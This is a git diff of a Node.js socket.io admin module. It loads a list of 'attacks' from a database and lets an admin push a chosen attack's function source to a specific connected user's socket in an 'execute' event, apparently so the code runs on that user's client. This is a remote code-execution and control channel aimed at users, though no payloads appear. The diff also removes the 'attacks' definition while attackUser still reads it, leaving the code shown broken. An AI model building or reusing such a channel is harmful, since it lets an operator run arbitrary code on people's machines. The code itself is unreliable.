@@ -1,17 +1,18 @@
 var socketio = require('socket.io');
-var clientSockets = require('../clientApp/sockets');
+var clientSockets = require('../userApp/sockets');
 var server = require('../server');
-var attacksObj = require('../attacks');
-//attacks is stored as an object for constant time lookup
-var attacks = attacksObj.attacks;
+var queryHandler = require('../../db/queryHandler');
+
 var attacksArr = [];
 
 module.exports.listen = function (app) {
   io = socketio.listen(app);
 
+  getAttackDescriptions();
+
   io.on('connection', function (socket) {
 
-    // console.log('admin connected');
+    console.log('admin connected');
 
     socket.join('admins');
 
@@ -38,16 +39,12 @@ module.exports.getUsers = function () {
   });
 };
 
-//build out attacks array once so it wont need to be recreated on each request for it
-for(var attack in attacks){
-  attacksArr.push(attacks[attack]);
-}
 module.exports.getAttacks = function () {
   module.exports.emit('attacks', attacksArr);
 };
 
 module.exports.disconnect = function () {
-  // console.log('admin disconnected');
+  console.log('admin disconnected');
 };
 
 module.exports.attackUser = function (data) {
@@ -59,4 +56,13 @@ module.exports.attackUser = function (data) {
     var attack = attacks[data.attack].attack; 
   }
   ioClient.to(data.userSocket).emit('execute', { func: "var attack = " + attack.toString(), inputs: data.inputs });
+};
+
+function getAttackDescriptions() {
+  console.log("Compiling attacks list");
+  queryHandler.getAllAttacks(function(attacks){
+    attacks.forEach(function(attack){
+      attacksArr.push(attack);
+    });
+  });
 };
